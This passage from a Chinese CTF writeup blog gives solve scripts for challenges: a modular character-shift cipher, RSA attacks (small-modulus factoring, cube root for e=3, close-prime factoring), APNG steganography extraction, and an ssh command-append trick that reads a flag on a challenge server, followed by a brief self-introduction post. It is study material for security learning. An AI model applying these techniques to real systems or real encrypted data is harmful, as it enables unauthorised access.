class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        k ^= key[j]<br>    xorrox.append(k)<br><span class="hljs-built_in">print</span>(xorrox)<br></code></pre></td></tr></table></figure><h1 id="unimod"><a class="markdownIt-Anchor" href="#unimod"></a> Unimod</h1><p>这题有点蛋疼。因为直接看数据文件格式有点不对。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> libnum<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>ct = <span class="hljs-string">&#x27;&#x27;</span><br>k = random.randrange(<span class="hljs-number">0</span>,<span class="hljs-number">0xFFFD</span>)<br><span class="hljs-comment"># k = 15449</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag:<br>    <br>    ct += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(c) + k) % <span class="hljs-number">0xFFFD</span>)<br>    <br>    <span class="hljs-comment"># a = chr((ord(c) + k) % 0xFFFD)</span><br>    <span class="hljs-comment"># print((ord(c) + k) % 0xFFFD)</span><br>    <span class="hljs-comment"># print(libnum.s2n(chr((ord(c) + k) % 0xFFFD)))</span><br>    <span class="hljs-comment"># print(ord(a))</span><br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(ct.encode())<br><br></code></pre></td></tr></table></figure><p>注释部分是我测试的部分。原题目是没有的。</p><p>以下是原题目的十六进制数据。可以看到很明显的三个字节一个分组。但是从代码上看，我们的到的数据应该是两个字节一个分组。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">E9</span> A5 <span class="hljs-number">87</span> E9 A5 <span class="hljs-number">8</span>D E9 A5 <span class="hljs-number">82</span> E9 A5 <span class="hljs-number">88</span> E9 A5 <span class="hljs-number">9</span>C E9 A4 <span class="hljs-number">95</span> E9 A5 <span class="hljs-number">86</span> E9 A4 <span class="hljs-number">97</span> E9 A4 <span class="hljs-number">99</span> E9 A5 <span class="hljs-number">85</span> E9 A4 <span class="hljs-number">92</span> E9 A4 <span class="hljs-number">97</span> E9 A5 <span class="hljs-number">82</span> E9 A4 <span class="hljs-number">97</span> E9 A4 <span class="hljs-number">92</span> E9 A5 <span class="hljs-number">83</span> E9 A5 <span class="hljs-number">84</span> E9 A4 <span class="hljs-number">93</span> E9 A5 <span class="hljs-number">86</span> E9 A5 <span class="hljs-number">82</span> E9 A4 <span class="hljs-number">98</span> E9 A4 <span class="hljs-number">93</span> E9 A5 <span class="hljs-number">85</span> E9 A4 <span class="hljs-number">96</span> E9 A5 <span class="hljs-number">87</span> E9 A4 <span class="hljs-number">9</span>A E9 A4 <span class="hljs-number">98</span> E9 A4 <span class="hljs-number">92</span> E9 A4 <span class="hljs-number">94</span> E9 A4 <span class="hljs-number">95</span> E9 A4 <span class="hljs-number">95</span> E9 A5 <span class="hljs-number">86</span> E9 A4 <span class="hljs-number">99</span> E9 A4 <span class="hljs-number">95</span> E9 A5 <span class="hljs-number">87</span> E9 A4 <span class="hljs-number">92</span> E9 A4 <span class="hljs-number">92</span> E9 A5 <span class="hljs-number">9</span>E E9 A3 AB<br></code></pre></td></tr></table></figure><p>所以有了注释中的三条输出语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">15565<br>14922637<br>15565<br></code></pre></td></tr></table></figure><p>可以看到，这个数据经过编码成了三个字节。所以我们直接读文件，然后用三个字节分组，使用<strong>ord</strong>函数来解码，才能得到正确的值。</p><p>这里其实有个k，但是影响不大。这里0xFFFD其实比我们ASCII码的范围大了太多。基本上不会出现取的k刚好在0xFFFD的边界上。所以直接解就行了，如果不行那也就再加个0xFFFD进行处理就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br>data = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;out&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><br><span class="hljs-comment"># 反正挺坑的，一个2字节的数据二进制写入成了3字节，这里直接三字节分片然后用ord取他的数字就行</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">3</span>):<br>    a = data[i:i+<span class="hljs-number">3</span>].decode()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) - <span class="hljs-number">39137</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br><br>    <span class="hljs-comment"># 通过猜测第一个字符是&#x27;f&#x27;， 来计算k = 39137</span><br></code></pre></td></tr></table></figure><h1 id="baby-rsa-quiz"><a class="markdownIt-Anchor" href="#baby-rsa-quiz"></a> Baby RSA Quiz</h1><p>这题没有给文件而是以ssh的方式进行的。</p><p>一共三小题，第一小题给的是个小n，直接分解就行了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ---------<br>| Part 1: |<br> ---------<br>n = 115398298544369<br>e = 65537<br>ct = 37386859625793<br><br>What is the plaintext (in integer form)?<br></code></pre></td></tr></table></figure><p>这个直接上网站一分解就行。得到p，q求解d，然后算m。这里答案是整型的，但其实也是能转成字符串的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ---------<br>| Part 2: |<br> ---------<br> n = 21984385600649967782331863593924102436585066484191623195882222547673570244475780629687822167989708574426866726594728874805115343269798282457109572103808168717297643786879687407125835510708369369452066036081265495727817566573832554802942178842361272009775406486896598963082180982538712496148845771649987025233485619836564348850399478693602977813231635752371346486494990471592789061740477387129729970592609102941311866809610802313761260294058835607292101793124755896831042571976602987089357127373715869012159472398776658325559448411402063905089012465509274881162806001450685859679444595914638449991047584895744421268419<br> e = 3<br> ct = 26480272848384180570411447917437668635135597564435407928130220812155801611065536704781892656033726277516148813916446180796750368332515779970289682282804676030149428215146347671350240386440440048832713595112882403831539777582778645411270433913301224819057222081543727263602678819745693540865806160910293144052079393615890645460901858988883318691997438568705602949652125<br> What is the plaintext (in integer form)?<br></code></pre></td></tr></table></figure><p>这里可以看到加密指数e很小，所以我们只需要开方求解就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> iroot<br><span class="hljs-keyword">import</span> libnum<br><br>e = <span class="hljs-number">0x3</span><br>n = <span class="hljs-number">21984385600649967782331863593924102436585066484191623195882222547673570244475780629687822167989708574426866726594728874805115343269798282457109572103808168717297643786879687407125835510708369369452066036081265495727817566573832554802942178842361272009775406486896598963082180982538712496148845771649987025233485619836564348850399478693602977813231635752371346486494990471592789061740477387129729970592609102941311866809610802313761260294058835607292101793124755896831042571976602987089357127373715869012159472398776658325559448411402063905089012465509274881162806001450685859679444595914638449991047584895744421268419</span><br>c = <span class="hljs-number">26480272848384180570411447917437668635135597564435407928130220812155801611065536704781892656033726277516148813916446180796750368332515779970289682282804676030149428215146347671350240386440440048832713595112882403831539777582778645411270433913301224819057222081543727263602678819745693540865806160910293144052079393615890645460901858988883318691997438568705602949652125</span><br><br>k = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    res = iroot(c + k * n, e)  <span class="hljs-comment"># c+k*n 开3次方根 能开3次方即可</span><br>    <span class="hljs-keyword">if</span> (res[<span class="hljs-number">1</span>] == <span class="hljs-literal">True</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>]))<br>        <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>])))  <span class="hljs-comment"># 转为字符串</span><br>        <span class="hljs-keyword">break</span><br>    k = k + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>这里我打印了数字也打印了字符串，是从我之前的代码上改的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ---------<br>| Part 3: |<br> ---------<br> q = p + 2<br>while !(isPrime(q)):<br>    q += 2<br>n = p*q<br>n = 88881615737488301225985044439881905195398292505026841973979114989583620386889966196936383863573165224625895278832099461610638739494998960540693208136536764698022077924393297727577553457866191347931512435919295847354039191586621873435195696477610004925566087150861042148930517495281441139741545346918379251933<br>e = 65537<br>ct = 20631059905657990621121472678172311137355898932087354262172309893885321498925560019065033573185005618575156342764326342253251212781095718707971251014407982342185739678572043698218123534431914415817339019215948120246829763194761668345794978860628612447418680047622373133912651452245133307912003452486642093319<br>What is the plaintext (in integer form)?<br></code></pre></td></tr></table></figure><p>这里给出了两个素数生成的方法。可以看到这两个素数应该是比较接近的。</p><p>所以直接用yafu尝试进行分解。yafu比较适合这种情况。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">fac: factoring 88881615737488301225985044439881905195398292505026841973979114989583620386889966196936383863573165224625895278832099461610638739494998960540693208136536764698022077924393297727577553457866191347931512435919295847354039191586621873435195696477610004925566087150861042148930517495281441139741545346918379251933<br>fac: using pretesting plan: normal<br>fac: no tune info: using qs/gnfs crossover of 95 digits<br>div: primes less than 10000<br>fmt: 1000000 iterations<br>Total factoring time = 0.6750 seconds<br><br><br>***factors found***<br><br>P154 = 9427704690829486372323834254401690991535897190805758825455941539744129948703411885292076952568876153202122275131143524310245302189466786096848123870588379<br>P154 = 9427704690829486372323834254401690991535897190805758825455941539744129948703411885292076952568876153202122275131143524310245302189466786096848123870588327<br><br>ans = 1<br></code></pre></td></tr></table></figure><p>可以看到很快就出答案了。这样p和q就分解出来了。后面就是单纯的rsa运算了。</p><p>后面还做了一道隐写</p><h1 id="ostrich"><a class="markdownIt-Anchor" href="#ostrich"></a> Ostrich</h1><p>一共给了三个文件。</p><p>一张图片，一个算法，一个结果。</p><p>应该对算法进行逆向就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> imageio<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, GifImagePlugin<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes <span class="hljs-keyword">as</span> l2b, bytes_to_long <span class="hljs-keyword">as</span> b2l<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> apng <span class="hljs-keyword">import</span> APNG<br><br>filenames = []<br>flag = <span class="hljs-string">&quot;REDACTED&quot;</span> <br><br>orig_filename = <span class="hljs-string">&quot;ostrich.jpg&quot;</span><br>orig_image = Image.<span class="hljs-built_in">open</span>(orig_filename)<br>pixels = orig_image.load()<br>width, height = orig_image.size<br>images = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    new_filename = <span class="hljs-string">f&#x27;./images/ostrich<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span><br>    new_image = Image.new(orig_image.mode, orig_image.size)<br>    new_pixels = new_image.load()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>            new_pixels[x,y] = orig_image.getpixel((x, y))<br><br>    x = random.randrange(<span class="hljs-number">0</span>,width)<br>    y = random.randrange(<span class="hljs-number">0</span>,height)<br>    pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((x, y)))<br>    <span class="hljs-keyword">while</span>(pixel[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>):<br>        x = random.randrange(<span class="hljs-number">0</span>,width)<br>        y = random.randrange(<span class="hljs-number">0</span>,height)<br>        pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((random.randrange(<span class="hljs-number">0</span>,width), random.randrange(<span class="hljs-number">0</span>,height))))<br>    <br>    new_val = l2b(pixel[<span class="hljs-number">2</span>]*<span class="hljs-built_in">ord</span>(flag[i]))<br>    pixel[<span class="hljs-number">0</span>] = new_val[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(new_val) &gt; <span class="hljs-number">1</span>:<br>        pixel[<span class="hljs-number">1</span>] = new_val[<span class="hljs-number">1</span>]<br>    pixel[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br><br>    new_pixels[x, y] = (pixel[<span class="hljs-number">0</span>], pixel[<span class="hljs-number">1</span>], pixel[<span class="hljs-number">2</span>])<br>    new_image.save(new_filename)<br>    filenames.append(new_filename)<br>    images.append(new_image)<br><br>APNG.from_files(filenames, delay=<span class="hljs-number">0</span>).save(<span class="hljs-string">&quot;result.apng&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>最后保存的是一个APNG文件，这是个动图文件，但这里不会动就是了。</p><p>大致流程先看了一遍。我们先把文件提出来，这里的APNG动图也是多幅图片在一起构成的。每张图片里面嵌入了一个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> PIL<br><span class="hljs-keyword">from</span> apng <span class="hljs-keyword">import</span> APNG<br><br>img = APNG.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;result.apng&quot;</span>)<br><br><span class="hljs-keyword">for</span> i, (png, control) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(img.frames):<br>    png.save(<span class="hljs-string">&quot;./extract/&#123;i&#125;.png&quot;</span>.<span class="hljs-built_in">format</span>(i=i))<br></code></pre></td></tr></table></figure><p>一共提取了38张图片。</p><p>来讲一下嵌入的流程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">x = random.randrange(<span class="hljs-number">0</span>, width)<br>y = random.randrange(<span class="hljs-number">0</span>, height)<br>pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((x, y)))<br><span class="hljs-keyword">while</span> (pixel[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>):<br>    x = random.randrange(<span class="hljs-number">0</span>, width)<br>    y = random.randrange(<span class="hljs-number">0</span>, height)<br>    pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((random.randrange(<span class="hljs-number">0</span>, width), random.randrange(<span class="hljs-number">0</span>, height))))<br></code></pre></td></tr></table></figure><p>最主要的部分在这里。</p><p>这里要找一个B通道值不为0的点。原始图像中找一个B通道不为0的点，基本上所有的点都不可能B通道为0，所以其实就是随机的在里面找一个点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">new_val = l2b(pixel[<span class="hljs-number">2</span>] * <span class="hljs-built_in">ord</span>(flag[i]))<br> pixel[<span class="hljs-number">0</span>] = new_val[<span class="hljs-number">0</span>]<br> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(new_val) &gt; <span class="hljs-number">1</span>:<br>     pixel[<span class="hljs-number">1</span>] = new_val[<span class="hljs-number">1</span>]<br> pixel[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>在这里面，又把我们的值改成了0。这就让这个点很好找了。。</p><p>所以我们只需要找到这个点，读取这个点的像素值，然后和原始图像的这个点做运算就可以得到flag。</p><p>只要和原图比较多了哪一个b通道值为0 的点就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, GifImagePlugin<br><span class="hljs-keyword">from</span> apng <span class="hljs-keyword">import</span> APNG<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes <span class="hljs-keyword">as</span> l2b, bytes_to_long <span class="hljs-keyword">as</span> b2l<br><br>origin = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;ostrich.jpg&quot;</span>)<br>zero_dot = []<br>width, height = origin.size<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">if</span> origin.getpixel((x,y))[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>:<br>            zero_dot.append((x,y))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">38</span>):<br>    current_img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;./extract/<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br>    width, height = current_img.size<br>    image = Image.new(current_img.mode, current_img.size)<br>    pixels = image.load()<br>    change_dot = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        <span class="hljs-keyword">if</span> change_dot <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>            pixels[x, y] = current_img.getpixel((x, y))<br>            <span class="hljs-keyword">if</span> pixels[x,y][<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> (x,y) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> zero_dot:<br>                    <span class="hljs-comment"># print(f&quot;&#123;i&#125; :&quot;,(x,y), &quot;is the change point&quot;)</span><br>                    change_dot = (x,y)<br><br>    origin_blue = origin.getpixel(change_dot)[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-comment"># 基本上都会出现两个字节长度</span><br>    value = <span class="hljs-built_in">bytes</span>([current_img.getpixel(change_dot)[<span class="hljs-number">0</span>],current_img.getpixel(change_dot)[<span class="hljs-number">1</span>]])<br>    value = b2l(value)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(value//origin_blue), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>以下是后面添加的。（2022/05/03）</p><h1 id="steam-locomotive"><a class="markdownIt-Anchor" href="#steam-locomotive"></a> Steam Locomotive</h1><p>这题很好玩。</p><p>用ssh链接目标服务器之后。执行的是SL这个命令，而且此时我们会被阻塞无法操作。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><br><br>                      (  ) (@<span class="hljs-meta">@)</span> ( )  (<span class="hljs-meta">@)</span>  ()    @@    O     @     O     @      O<br>                 (@@<span class="hljs-meta">@)</span><br>             (    )<br>          (@@@<span class="hljs-meta">@)</span><br><br>        (   )<br>      ====        ________                ___________<br>  _D _|<span class="hljs-string">  </span>|<span class="hljs-string">_______/        \__I_I_____===__</span>|<span class="hljs-string">_________</span>|<br>   |<span class="hljs-string">(_)---  </span>|<span class="hljs-string">   H\________/ </span>|<span class="hljs-string">   </span>|<span class="hljs-string">        =</span>|<span class="hljs-string">___ ___</span>|<span class="hljs-string">      _________________</span><br><span class="hljs-string">   /     </span>|<span class="hljs-string">  </span>|<span class="hljs-string">   H  </span>|<span class="hljs-string">  </span>|<span class="hljs-string">     </span>|<span class="hljs-string">   </span>|<span class="hljs-string">         </span>||<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>||<span class="hljs-string">     _</span>|<span class="hljs-string">                \_____A</span><br><span class="hljs-string">  </span>|<span class="hljs-string">      </span>|<span class="hljs-string">  </span>|<span class="hljs-string">   H  </span>|<span class="hljs-string">__--------------------</span>|<span class="hljs-string"> [___] </span>|<span class="hljs-string">   =</span>|<span class="hljs-string">                        </span>|<br>  |<span class="hljs-string"> ________</span>|<span class="hljs-string">___H__/__</span>|<span class="hljs-string">_____/[][]~\_______</span>|<span class="hljs-string">       </span>|<span class="hljs-string">   -</span>|<span class="hljs-string">                        </span>|<br>  |<span class="hljs-string">/ </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-----------I_____I [][] []  D   </span>|<span class="hljs-string">=======</span>|<span class="hljs-string">____</span>|<span class="hljs-string">________________________</span>|_<br>__/ =|<span class="hljs-string"> o </span>|<span class="hljs-string">=-~~\  /~~\  /~~\  /~~\ ____Y___________</span>|<span class="hljs-string">__</span>|<span class="hljs-string">__________________________</span>|_<br> |<span class="hljs-string">/-=</span>|<span class="hljs-string">___</span>|<span class="hljs-string">=O=====O=====O=====O   </span>|<span class="hljs-string">_____/~\___/          </span>|<span class="hljs-string">_D__D__D_</span>|<span class="hljs-string">  </span>|<span class="hljs-string">_D__D__D_</span>|<br>  \_/      \__/  \__/  \__/  \__/      \_/               \_/   \_/    \_/   \_/<br><br><br><br></code></pre></td></tr></table></figure><p>火车跑完，连接也断开了。这是一道简单题，但是我真的不会做。后面看别人的writeup才知道。原来ssh连接可以直接带命令。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\lanpesk&gt;ssh <span class="hljs-literal">-p</span> <span class="hljs-number">31404</span> user@challenge.nahamcon.com <span class="hljs-built_in">ls</span><br>user@challenge.nahamcon.com<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">flag.txt</span><br></code></pre></td></tr></table></figure><p>这里我们连接的时候直接带上一个ls命令。结果我们可以看到有个flag文件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\lanpesk&gt;ssh <span class="hljs-literal">-p</span> <span class="hljs-number">31404</span> user@challenge.nahamcon.com <span class="hljs-built_in">cat</span> flag*<br>user@challenge.nahamcon.com<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">flag&#123;4f9b10a81141c7a07a494c28bd91d05b&#125;</span><br></code></pre></td></tr></table></figure><p>这样我们就能在ssh阻塞的情况下执行其他命令。算是学到了一些小知识。我觉得可以出在我们学校的新生赛里面嘿嘿。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>MISC</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/04/28/hello-world/"/>
    <url>/2022/04/28/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to my blog! This post I will introduce myself.</p><span id="more"></span><h2 id="who-am-i"><a class="markdownIt-Anchor" href="#who-am-i"></a> Who am I</h2><p>大学生一枚。计算机相关专业。如果有什么问题想和我讨论的话，请到github找我或者通过以下邮箱联系：</p><p><a href="mailto:professornameshou@gmail.com">professornameshou@gmail.com</a></p><h2 id="what-do-i-like"><a class="markdownIt-Anchor" href="#what-do-i-like"></a> What do I like</h2><p>当然是代码咯。还有各种有趣的项目。想做的事情那可真是太多了，但有时间我都会一一来做的。还有各种有趣的比赛，当然CTF也是其中之一。</p><p>以上就是我的自述啦。有什么问题还请邮件联系！希望我的博客能够帮助到你。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
